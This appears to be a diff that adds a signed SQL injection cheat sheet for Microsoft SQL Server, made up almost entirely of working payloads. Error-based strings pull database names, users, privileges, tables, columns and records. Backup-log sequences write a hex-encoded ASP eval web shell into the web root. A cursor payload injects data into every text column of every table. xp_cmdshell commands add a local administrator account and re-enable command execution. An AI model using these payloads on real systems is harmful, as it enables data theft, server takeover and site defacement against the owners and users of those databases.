@@ -1,0 +1,120 @@
+>>>  Get db name:
+ and db_name()=0
+ and db_name(0)=0
+ and db_name(__i__)=0
+ and quotename(db_name(__i__))=0
+
+>>>  Get username:
+ and user=0
+
+>>>  Get Version:
+ and @@version=0
+
+>>>  Get servername
+ and @@servername=0
+
+>>>  Get service name:
+ and @@servicename=0
+
+>>>  Get system user:
+ and system_user=0
+
+>>>  Get all basic informations at once:
+ AnD (dB_NaMe(0)+cHaR(124)+uSeR+cHaR(124)+@@vErSiOn+cHaR(124)+@@sErVeRnAmE+cHaR(124)+@@sErViCeNaMe+cHaR(124)+sYsTeM_UsEr)=0
+
+>>>  Get privilleges:
+ AnD (cAsT(iS_srvrOlEmEmBeR(0x730079007300610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x64006200630072006500610074006f007200)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x620075006c006b00610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x6400690073006b00610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_srvrOlEmEmBeR(0x730065007200760065007200610064006d0069006e00)aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x7000750062006c0069006300) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006f0077006e0065007200) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006200610063006b00750070006f00700065007200610074006f007200) aS vArChAr)+cHaR(94)+cAsT(iS_mEmBeR (0x640062005f006400610074006100770072006900740065007200) aS vArChAr))=0
+
+>>>  Get db count:
+ AnD (sElEcT cAsT(cOuNt(1) aS nvArChAr(100))+cHaR(9) FrOm mAsTeR..sYsDaTaBaSeS)=0
+
+>>>  Get db filename:
+ and (select top 1 filename from (select top __i__ filename from master..sysdatabases order by filename) t order by filename desc)=0
+
+>>>  Get db name and filename at once:
+ AnD (sElEcT ToP 1 rtrim(iSnUlL(cAsT(nAmE aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(filenAmE aS nvArChAr(4000)),cHaR(32)))+cHaR(9) FrOm (sElEcT ToP __i__ nAmE,filenAmE FrOm mAsTeR..sYsDaTaBaSeS oRdEr bY nAmE) t oRdEr bY nAmE dEsC)=0
+
+>>>  Get table count of db:
+  and (select cast(count(1) as varchar)+char(9) from <dbname>..sysobjects where xtype=0x75)=0
+
+>>>  Get table names of db:
+ and (select top 1 name from (select top __i__ name from <dbname>..sysobjects where xtype=0X75 order by name) t order by name desc)=0
+ and (select top 1 quotename(name) from <dbname>.dbo.sysobjects where xtype=char(85) AND name not in (select top __i__ name from <dbname>.dbo.sysobjects where xtype=char(85)))=0
+
+>>>  Get field count:
+ and (select cast(count(1) as varchar)+char(9) from <dbname>..syscolumns where id=object_id('<tablename>'))=0
+
+>>>  Get field names:
+ and (select top 1 name from (select top __i__ name,id from <dbname>..syscolumns where id=object_id('<tablename>') order by name) t order by name desc)=0
+ and (select col_name(object_id('<tablename>'),__i__))=0
+
+>>>  Get record count:
+ AnD (sElEcT cAsT(cOuNt(1) aS nvArChAr(100))+cHaR(9) FrOm <dbname>..<tablename>)=0
+
+>>>  Get data:
+ AnD (sElEcT ToP 1 rtrim(iSnUlL(cAsT(<column_name1> aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(<column_name2> aS nvArChAr(4000)),cHaR(32)))+cHaR(9)+rtrim(iSnUlL(cAsT(<column_name3> aS nvArChAr(4000)),cHaR(32)))+cHaR(9) FrOm (sElEcT ToP __i__ <column_name1>,<column_name2>,<column_name3> FrOm <dbname>..<tablename> oRdEr bY <order_field_name>) t oRdEr bY <order_field_name> dEsC)=0
+
+
+>>>  Backup log to GetWebShell:
+--1. Create temp table and initial backup:
+; Alter Database TestDB Set Recovery Full Drop Table ttt Create Table ttt (a image) Backup Log TestDB to disk = '<Temp filename:e:\wwwroot\m.asp>' With Init--
+
+--2. Insert data
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)--
+
+--3. backup log , drop temp table
+;Backup Log <dbname> To Disk = '<Target file:e:\wwwroot\m.asp>';Drop Table ttt Alter Database TestDB Set Recovery SIMPLE--
+
+>>>  Backup database to GetWebShell:
+1. Prepare:
+;Declare @a Sysname;Set @a=db_name();Declare @file VarChar(400);Set @file=<Temp file:0x633A5C617364662E617370>;Drop Table ttt Create Table ttt(c Image) Backup Database @a To Disk=@file--
+
+2. Insert data to db:
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)-- 
+
+3. Backup database, do some clean:
+;Declare @b SysName;Set @b=db_name();Declare @file1 VarChar(400);Set @file1=<Target file:0x633A5C617364662E617370>;Backup Database @b To Disk=@file1 With Differential,Format;Drop Table ttt;--
+
+>>>  Update db:
+;update <dbname>..<tablename> set <field_name>=<field_name>+'<script>alert("Vulnerability found.")</script>' where <conditions>--
+
+>>>  Batch update db:
+;dEcLaRe @t vArChAr(255),@c vArChAr(255) dEcLaRe tAbLe_cursoR cUrSoR FoR sElEcT a.nAmE,b.nAmE FrOm sYsObJeCtS a,sYsCoLuMnS b wHeRe a.iD=b.iD AnD a.xTyPe='u' AnD (b.xTyPe=99 oR b.xTyPe=35 oR b.xTyPe=231 oR b.xTyPe=167) oPeN tAbLe_cursoR fEtCh next FrOm tAbLe_cursoR iNtO @t,@c while(@@fEtCh_status=0) bEgIn exec('UpDaTe ['+@t+'] sEt ['+@c+']=rtrim(convert(varchar,['+@c+']))+cAsT(<Data to be inserted(0x....)> aS vArChAr(200<Modify as your need>))') fEtCh next FrOm tAbLe_cursoR iNtO @t,@c eNd cLoSe tAbLe_cursoR dEAlLoCaTe tAbLe_cursoR;--
+
+
+;DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name FROM sysobjects a,s yscolumns b WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<Data to be inserted>''') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor--
+
+>>>  Execute xp_cmdshell:
+;exec master..xp_cmdshell 'net user name password /add & net localgroup administrators name /add'--
+
+>>>  Restore xp_cmdshell:
+;Exec Master..sp_dropextendedproc 0x780070005F0063006D0064007300680065006C006C00;Exec Master..sp_addextendedproc 0x780070005F0063006D0064007300680065006C006C00,0x78706C6F6737302E646C6C--
+
+>>> SQLServer 2005 active/deactive xp_cmdshell
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',1;RECONFIGURE;
+
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',0;RECONFIGURE;
+
+>>> SQLServer 2005 active/deactive OpenDataSource/OpenRowSet
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'Ad Hoc Distributed Queries',0;RECONFIGURE;
+
+>>> SQLServer 2005 Backup log
+
+alter database [testdb] set recovery full
+declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup database __dbname__ to disk=@d with init--
+
+drop table [itpro]--
+create table [itpro]([a] image)--
+declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup log __dbname__ to disk=@d with init--
+
+insert into [itpro]([a]) values(__varchar(Data to be inserted))--
+declare @d nvarchar(4000) set @d=__nvarchar(filename) backup log __dbname__ to disk=@d with init--
+
+drop table [itpro] declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup log __dbname__ to disk=@d with init--
+
+
+
+	www.liqidis.com
+	liqidis@hotmail.com
+	liqidis@gmail.com
